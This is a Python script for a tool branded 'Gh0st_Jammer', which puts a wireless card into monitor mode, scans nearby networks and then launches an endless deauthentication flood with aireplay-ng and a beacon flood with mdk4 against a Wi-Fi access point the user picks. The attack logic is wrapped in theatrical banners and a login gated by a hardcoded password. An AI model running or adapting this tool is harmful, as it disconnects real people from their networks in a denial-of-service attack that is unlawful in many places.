import os
import time
import subprocess
from getpass import getpass
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich import box

console = Console()

USERNAME = "kuldeep"
PASSWORD = "hacker123"
interface = "wlan0"

# =====================
# Audio Playback System
# =====================
def play_voice(filename):
    path = os.path.join(os.path.dirname(__file__), filename)
    os.system(f'mpg123 "{path}" > /dev/null 2>&1')

# =====================
# Animation Loader
# =====================
def wait_anim(message="Summoning the ghost...", seconds=4):
    with Progress(
        SpinnerColumn(style="red"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None),
        TimeElapsedColumn(),
        transient=True,
    ) as progress:
        task = progress.add_task(f"[bold green]{message}", total=seconds)
        for _ in range(seconds):
            time.sleep(1)
            progress.advance(task)

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

# =====================
# Login Banner (Standard)
# =====================
def banner_main():
    clear_screen()
    banner = """
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗     ███████╗██╗
██╔════╝ ██║  ██║██╔═████╗██╔════╝╚══██╔══╝     ██╔════╝██║
██║  ███╗███████║██║██╔██║███████╗   ██║        █████╗  ██║
██║   ██║██╔══██║████╔╝██║╚════██║   ██║        ██╔══╝  ██║
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║███████╗██║     ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝╚══════╝╚═╝     ╚═╝
                                                           
     ██╗ █████╗ ███╗   ███╗███████╗██████╗                 
     ██║██╔══██╗████╗ ████║██╔════╝██╔══██╗                
     ██║███████║██╔████╔██║█████╗  ██████╔╝                
██   ██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗                
╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║  ██║                
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝                
                                                                
"""
    panel = Panel.fit(Text(banner, style="bold cyan"),
                      title="🔥 Gh0st_Jammer (WiFi Jammer) 🔥",
                      subtitle="Created by Kuldeep | Cyber_Yodha",
                      border_style="bright_red", box=box.HEAVY)
    console.print(panel)
    wait_anim("Loading tool...", 3)

# =====================
# Bhayanak Skull Banner (After Login)
# =====================
def print_scary_banner():
    skull = Text()
    skull.append("         ______\n", style="bold red")
    skull.append("      .-'      '-.\n", style="bold red")
    skull.append("     /            \\\n", style="bold red")
    skull.append("    |              |\n", style="bold red")
    skull.append("    |,  .-.  .-.  ,|\n", style="bold magenta")
    skull.append("    | )(_o/  \\o_)( |\n", style="bold magenta")
    skull.append("    |/     /\\     \\|\n", style="bold yellow")
    skull.append("    (_     ^^     _)\n", style="bold yellow")
    skull.append("     \\__|IIIIII|__/\n", style="bold cyan")
    skull.append("      | \\IIIIII/ |\n", style="bold cyan")
    skull.append("      \\          /\n", style="bold green")
    skull.append("       `--------`\n", style="bold green")
    skull.append("\n[☠️  GHOST JAMMER READY  ☠️]\n", style="bold white on red")
    console.print(skull)
    time.sleep(5)

# =====================
# Exit Panel
# =====================
def banner_exit():
    panel = Panel.fit(Text("💀 THANK YOU FOR USING GHOST JAMMER 💀", justify="center", style="bold white on red"),
                      title="Exiting...", border_style="bright_magenta")
    console.print(panel)

# =====================
# Login System
# =====================
def login():
    banner_main()
    console.print(Panel("🔐 [bold red]Login Required[/bold red]", style="bold green", border_style="cyan"))
    username = console.input("[bold yellow]> Username:[/bold yellow] ")
    password = getpass("🔐 Password: ")

    if username == USERNAME and password == PASSWORD:
        play_voice("intro.mp3")
        return True
    else:
        console.print("[bold red]❌ Invalid credentials![/bold red]")
        return False

# =====================
# Network Setup
# =====================
def enable_monitor_mode():
    os.system(f"sudo ifconfig {interface} down")
    os.system(f"sudo iwconfig {interface} mode monitor")
    os.system(f"sudo ifconfig {interface} up")
    print(f"[+] {interface} is now in monitor mode")

def scan_networks():
    print("[*] Scanning for Wi-Fi networks... (CTRL+C to stop)")
    time.sleep(2)
    os.system(f"sudo airodump-ng {interface}")

def restore_interface():
    print("[*] Restoring interface...")
    os.system(f"sudo ifconfig {interface} down")
    os.system(f"sudo iwconfig {interface} mode managed")
    os.system(f"sudo ifconfig {interface} up")
    print(f"[+] {interface} is back to managed mode.")

# =====================
# Jamming (Deauth + Beacon)
# =====================
def start_jamming(bssid, channel):
    print(f"[+] Target BSSID: {bssid} on Channel: {channel}")
    print("[*] Setting channel...")
    os.system(f"sudo iwconfig {interface} channel {channel}")
    
    print("[*] Starting Deauth + Beacon Flood attack... (Press CTRL+C to stop)")
    time.sleep(1)

    try:
        deauth_proc = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface])
        mdk4_proc = subprocess.Popen(["sudo", "mdk4", interface, "b", "-c", channel, "-t", bssid])

        deauth_proc.wait()
        mdk4_proc.wait()

    except KeyboardInterrupt:
        print("\n[!] CTRL+C pressed. Stopping attacks...")
        deauth_proc.terminate()
        mdk4_proc.terminate()
        restore_interface()
        banner_exit()
        play_voice("exit.mp3")

# =====================
# Main Function
# =====================
def main():
    if login():
        clear_screen()
        print_scary_banner()  # 🎃 Replaces boring old print banner
        enable_monitor_mode()
        scan_networks()

        bssid = input("\n[+] Enter Target BSSID (MAC Address): ")
        channel = input("[+] Enter Target Channel: ")
        start_jamming(bssid, channel)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        restore_interface()
        banner_exit()
        play_voice("exit.mp3")
